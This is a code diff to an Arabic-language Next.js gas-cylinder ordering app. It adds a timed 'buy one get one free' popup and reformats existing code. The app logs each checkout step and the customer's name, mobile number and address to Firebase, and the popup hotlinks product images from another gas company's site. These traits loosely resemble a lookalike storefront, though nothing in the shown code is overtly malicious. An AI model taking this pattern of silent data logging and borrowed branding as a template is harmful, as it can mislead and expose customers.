@@ -1,7 +1,7 @@
 "use client"
 
-import { useState, useEffect, type SetStateAction } from "react"
-import { Moon, Plus, Minus, Sun, MapPin, CreditCard, Wallet, Check, MessageCircle } from "lucide-react"
+import { useState, useEffect, type SetStateAction, useRef } from "react"
+import { Moon, Plus, Minus, Sun, MapPin, CreditCard, Wallet, Check, X } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Separator } from "@/components/ui/separator"
 import { useTheme } from "next-themes"
@@ -12,6 +12,7 @@ import { Input } from "@/components/ui/input"
 import { addData } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
 import { useRouter } from "next/navigation"
+import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"
 
 export default function GasCylinderApp() {
   const [step, setStep] = useState(1)
@@ -27,6 +28,8 @@ export default function GasCylinderApp() {
   const { theme, setTheme } = useTheme()
   const [mounted, setMounted] = useState(false)
   const _id = randstr("gas-")
+  const [showPromoPopup, setShowPromoPopup] = useState(false)
+  const popupShownRef = useRef(false)
 
   // Sample addresses
   const savedAddresses: any = [
@@ -73,6 +76,18 @@ export default function GasCylinderApp() {
     getLocation().then(() => {})
   }, [])
 
+  useEffect(() => {
+    // Show popup after 2 seconds if it hasn't been shown before
+    if (!popupShownRef.current) {
+      const timer = setTimeout(() => {
+        setShowPromoPopup(true)
+        popupShownRef.current = true
+      }, 2000)
+
+      return () => clearTimeout(timer)
+    }
+  }, [])
+
   const incrementCount = () => {
     setCylinderCount((prev) => prev + 1)
   }
@@ -83,9 +98,9 @@ export default function GasCylinderApp() {
 
   const nextStep = () => {
     setStep((prev) => prev + 1)
-    const _id=localStorage.getItem('visitor')
+    const _id = localStorage.getItem("visitor")
 
-    addData({id:_id,step})
+    addData({ id: _id, step })
   }
 
   const prevStep = () => {
@@ -143,14 +158,17 @@ export default function GasCylinderApp() {
       apartment,
       mobile,
     }
-    const _id=localStorage.getItem('visitor')
+    const _id = localStorage.getItem("visitor")
 
     // Add to savedAddresses
     savedAddresses.push(newAddress)
-    addData({id:_id,customer: {
-      name: savedAddresses!.name || "غير محدد" as string,
-      mobile: savedAddresses!.mobile as string
-    } as any})
+    addData({
+      id: _id,
+      customer: {
+        name: savedAddresses!.name || ("غير محدد" as string),
+        mobile: savedAddresses!.mobile as string,
+      } as any,
+    })
     // Select the new address
     setSelectedAddress(newAddress.id)
 
@@ -168,12 +186,11 @@ export default function GasCylinderApp() {
 
     // Calculate total price
     const totalPrice = cylinderCount * 5 + 1
-    localStorage.setItem('total',totalPrice?.toString()!)
+    localStorage.setItem("total", totalPrice?.toString()!)
     // Create order data object
     const orderData = {
-
       id: _id,
-      step:step,
+      step: step,
       timestamp: new Date().toISOString(),
       customer: {
         name: selectedAddressData?.name || "غير محدد",
@@ -183,7 +200,7 @@ export default function GasCylinderApp() {
         building: selectedAddressData?.building || "غير محدد",
         floor: selectedAddressData?.floor || "غير محدد",
         apartment: selectedAddressData?.apartment || "غير محدد",
-        mobile: selectedAddressData?.mobile ||mobile,
+        mobile: mobile,
       },
       order: {
         cylinderCount: cylinderCount,
@@ -222,7 +239,6 @@ export default function GasCylinderApp() {
       <header className="p-4 flex justify-between items-center">
         <h1 className={`text-3xl font-bold ${theme === "light" ? "text-green-600" : "text-green-500"}`}>سلندر غاز</h1>
         <div className="flex items-center gap-2">
-         
           <Button variant="ghost" size="icon" onClick={toggleTheme} className="rounded-full">
             {theme === "dark" ? (
               <Moon className="h-5 w-5 text-gray-400" />
@@ -502,7 +518,7 @@ export default function GasCylinderApp() {
             {!showAddAddress ? (
               <div className="w-full max-w-md">
                 <RadioGroup value={selectedAddress} onValueChange={setSelectedAddress} className="space-y-4">
-                  {savedAddresses.map((address:any) => (
+                  {savedAddresses.map((address: any) => (
                     <div
                       key={address.id}
                       className={`flex items-start p-4 rounded-lg border ${
@@ -681,7 +697,7 @@ export default function GasCylinderApp() {
                     <Input
                       id="mobile"
                       placeholder="رقم الهاتف المحمول"
-                      onChange={(e)=>setMobile(e.target.value)}
+                      onChange={(e) => setMobile(e.target.value)}
                       className={`mt-1 ${
                         theme === "light" ? "bg-gray-50 border-gray-300" : "bg-gray-700 border-gray-600"
                       }`}
@@ -870,18 +886,77 @@ export default function GasCylinderApp() {
             العودة إلى الصفحة الرئيسية
           </Link>
         </div>
-        <div className="mt-6">
-        
-        </div>
+        <div className="mt-6"></div>
       </footer>
       <Link
-            href="https://wa.me/9659603444"
-            target="_blank"
-            rel="noopener noreferrer"
-            className={`fixed bottom-4 right-4 rounded-full ${theme === "light" ? "bg-green-600 hover:bg-green-700" : "bg-green-500 hover:bg-green-600"} text-white font-bold`}
-          >
-            <img src="/next.svg" className="h-12 w-12 p-2"  />
-          </Link>
+        href="https://wa.me/9659603444"
+        target="_blank"
+        rel="noopener noreferrer"
+        className={`fixed bottom-4 right-4 rounded-full ${theme === "light" ? "bg-green-600 hover:bg-green-700" : "bg-green-500 hover:bg-green-600"} text-white font-bold`}
+      >
+        <img src="/next.svg" className="h-12 w-12 p-2" />
+      </Link>
+      {/* Buy One Get One Popup */}
+      <Dialog open={showPromoPopup} onOpenChange={setShowPromoPopup}>
+        <DialogContent className="sm:max-w-md" dir="rtl">
+          <DialogHeader>
+            <div className="flex justify-between items-center">
+              <DialogTitle className={`text-xl font-bold ${theme === "light" ? "text-green-600" : "text-green-500"}`}>
+                عرض خاص! اشتري واحدة واحصل على الثانية مجانًا
+              </DialogTitle>
+              <Button
+                variant="ghost"
+                size="icon"
+                onClick={() => setShowPromoPopup(false)}
+                className="h-6 w-6 rounded-full p-0"
+              >
+                <X className="h-4 w-4" />
+              </Button>
+            </div>
+          </DialogHeader>
+          <div className="p-4">
+            <div className="flex justify-center mb-4">
+              <img
+                src="https://gaskw.com/storage/form-attachments/01JHBJYXM6BJEYNFC3CAV2K9PQ.png"
+                alt="Gas Cylinder Promotion"
+                width={80}
+                height={160}
+                className="object-contain"
+              />
+              <span className="mx-2 text-2xl font-bold flex items-center">+</span>
+              <img
+                src="https://gaskw.com/storage/form-attachments/01JHBJYXM6BJEYNFC3CAV2K9PQ.png"
+                alt="Gas Cylinder Free"
+                width={80}
+                height={160}
+                className="object-contain"
+              />
+            </div>
+            <DialogDescription className="text-center mb-4">
+              عرض لفترة محدودة! عند شراء اسطوانة غاز واحدة، احصل على الثانية مجانًا. العرض ساري حتى نفاد الكمية.
+            </DialogDescription>
+            <div className="flex flex-col gap-2">
+              <Button
+                className={`${theme === "light" ? "bg-green-600 hover:bg-green-700" : "bg-green-500 hover:bg-green-600"} text-white font-bold`}
+                onClick={() => {
+                  setCylinderCount(2)
+                  setShowPromoPopup(false)
+                  setStep(1)
+                }}
+              >
+                استفد من العرض الآن
+              </Button>
+              <Button
+                variant="outline"
+                className={`${theme === "light" ? "border-gray-300 text-gray-700" : "border-gray-600 text-gray-300"}`}
+                onClick={() => setShowPromoPopup(false)}
+              >
+                تصفح العروض لاحقًا
+              </Button>
+            </div>
+          </div>
+        </DialogContent>
+      </Dialog>
     </div>
   )
 }
